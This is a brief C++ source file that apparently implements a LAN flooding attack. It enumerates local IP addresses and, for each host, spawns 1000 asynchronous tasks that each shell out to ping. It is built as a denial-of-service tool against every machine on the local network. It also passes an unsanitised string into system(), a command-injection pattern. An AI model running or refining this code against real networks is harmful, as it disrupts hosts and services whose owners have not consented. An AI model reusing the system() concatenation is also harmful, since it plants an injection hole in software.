//
// Created by ubuntu on 24-2-12.
//
#include "config.h"

void one_attack(const string&& ip) {
    int attack_number = 0;
    system(("ping " + ip).c_str());
}

void attack(string ip) {
    vector<future<void>> new_thread;
    for (int i = 0 ; i< 1000 ;i++) {
        new_thread.emplace_back(async(one_attack , ip));
    }
}

void lan_attack() {
    vector<string> ip_list = lan_ip_address();
    vector<future<void>> thread_vector;
    for (auto & i : ip_list) {
        thread_vector.emplace_back(async(attack , i));
    }
}